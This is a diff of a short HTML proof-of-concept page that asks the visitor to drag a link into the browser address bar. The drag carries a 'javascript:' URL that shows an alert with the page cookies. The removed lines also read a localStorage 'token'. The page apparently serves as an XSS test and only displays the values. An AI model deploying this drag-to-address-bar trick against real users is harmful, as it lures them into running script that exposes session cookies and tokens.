@@ -1,21 +1,21 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Drag Exploit</title>
+  <title>Drag XSS Test</title>
 </head>
 <body>
 
 <h2>Drag this to the address bar 👇</h2>
 
-<a draggable="true" id="exploit" style="padding:10px;background:red;color:white;cursor:grab;">
-  Drag Me
+<a href="#" draggable="true" id="dragme" style="padding:10px;background:red;color:white;cursor:grab;">
+  Drag me
 </a>
 
 <script>
-document.getElementById('exploit').ondragstart = function(e) {
+document.getElementById('dragme').ondragstart = function(e) {
   e.dataTransfer.setData(
     'text/plain',
-    "javascript:alert('Cookie: '+document.cookie+' | Token: '+localStorage.getItem('token'))"
+    'javascript:alert(document.cookie)'
   );
 };
 </script>
